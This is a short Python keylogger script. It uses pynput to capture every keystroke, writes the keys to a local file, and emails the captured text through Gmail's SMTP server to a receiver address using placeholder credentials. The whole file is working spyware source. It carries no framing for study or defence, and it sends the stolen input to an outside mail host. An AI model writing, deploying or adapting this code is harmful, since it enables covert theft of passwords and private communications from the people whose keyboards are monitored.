import pynput
from pynput.keyboard import Key, Listener
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Set up the email parameters
email_sender = "sender@example.com"
email_password = "password"
email_receiver = "receiver@example.com"

# Set up the keylogger
keys = []

def on_press(key):
    global keys
    keys.append(str(key))

def on_release(key):
    global keys
    if key == Key.enter:
        write_to_file()
        keys = []
    elif key == Key.esc:
        return False

def write_to_file():
    global keys
    with open("keystrokes.txt", "a") as f:
        for key in keys:
            f.write(key)

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Send the keystrokes as an email
msg = MIMEMultipart()
msg["From"] = email_sender
msg["To"] = email_receiver
msg["Subject"] = "Keystrokes"
msg.attach(MIMEText("\n".join(keys), "plain"))

server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(email_sender, email_password)
text = msg.as_string()
server.sendmail(email_sender, email_receiver, text)
server.quit()